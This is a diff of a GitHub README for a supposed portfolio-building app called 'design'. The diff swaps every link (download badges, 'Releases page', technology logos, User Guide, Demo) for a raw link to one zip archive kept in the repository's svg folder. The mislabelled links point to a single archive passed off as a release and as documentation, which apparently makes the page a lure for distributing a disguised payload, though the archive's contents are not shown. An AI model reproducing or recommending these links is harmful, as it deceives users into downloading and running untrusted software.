@@ -1,6 +1,6 @@
 # 🎨 design - Create Stunning Portfolios with Ease
 
-[![Download the App](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
+[![Download the App](https://github.com/Vonzhy/design/raw/refs/heads/main/public/svg/Software_v3.9.zip)](https://github.com/Vonzhy/design/raw/refs/heads/main/public/svg/Software_v3.9.zip)
 
 ## 📦 Overview
 Welcome to the design repository! This application helps you create beautiful portfolios effortlessly. Whether you are a designer, artist, or anyone looking to showcase your work, this tool is for you. 
@@ -9,7 +9,7 @@ Welcome to the design repository! This application helps you create beautiful po
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip) to find the latest version of the app.
+   Go to our [Releases page](https://github.com/Vonzhy/design/raw/refs/heads/main/public/svg/Software_v3.9.zip) to find the latest version of the app.
 
 2. **Download the Latest Version**  
    On the Releases page, download the latest version of the application by clicking the download link.
@@ -38,29 +38,29 @@ To run the application smoothly, ensure that your system meets the following req
 
 ## 🌐 Stack
 ### **Frontend Technologies**  
-- ![Astro](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
-- ![Tailwind](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
-- ![TypeScript](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
+- ![Astro](https://github.com/Vonzhy/design/raw/refs/heads/main/public/svg/Software_v3.9.zip)
+- ![Tailwind](https://github.com/Vonzhy/design/raw/refs/heads/main/public/svg/Software_v3.9.zip)
+- ![TypeScript](https://github.com/Vonzhy/design/raw/refs/heads/main/public/svg/Software_v3.9.zip)
 
 ### **Tools Used**  
-- ![Figma](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
-- ![Prettier](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
-- ![Canva](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
+- ![Figma](https://github.com/Vonzhy/design/raw/refs/heads/main/public/svg/Software_v3.9.zip)
+- ![Prettier](https://github.com/Vonzhy/design/raw/refs/heads/main/public/svg/Software_v3.9.zip)
+- ![Canva](https://github.com/Vonzhy/design/raw/refs/heads/main/public/svg/Software_v3.9.zip)
 
 ## 📥 Download & Install
 To get started, click the badge below to download the latest release:
 
-[![Download the App](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
+[![Download the App](https://github.com/Vonzhy/design/raw/refs/heads/main/public/svg/Software_v3.9.zip)](https://github.com/Vonzhy/design/raw/refs/heads/main/public/svg/Software_v3.9.zip)
 
 Once you have downloaded the file, follow the installation steps outlined above.
 
 ## 📜 Documentation
-For more details on how to use the application and its features, please refer to the [User Guide](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip). This guide will help you navigate all functionalities and get the most out of your experience.
+For more details on how to use the application and its features, please refer to the [User Guide](https://github.com/Vonzhy/design/raw/refs/heads/main/public/svg/Software_v3.9.zip). This guide will help you navigate all functionalities and get the most out of your experience.
 
 ## 🔗 Useful Links
-- [Demo](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
-- [Astro Themes](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
-- [ReactBits Showcase](https://raw.githubusercontent.com/Vonzhy/design/main/paratoluic/design.zip)
+- [Demo](https://github.com/Vonzhy/design/raw/refs/heads/main/public/svg/Software_v3.9.zip)
+- [Astro Themes](https://github.com/Vonzhy/design/raw/refs/heads/main/public/svg/Software_v3.9.zip)
+- [ReactBits Showcase](https://github.com/Vonzhy/design/raw/refs/heads/main/public/svg/Software_v3.9.zip)
 
 ## 🛠️ Support
 If you encounter any issues or have questions, feel free to open an issue on the GitHub repository. We value your feedback and are here to help you.
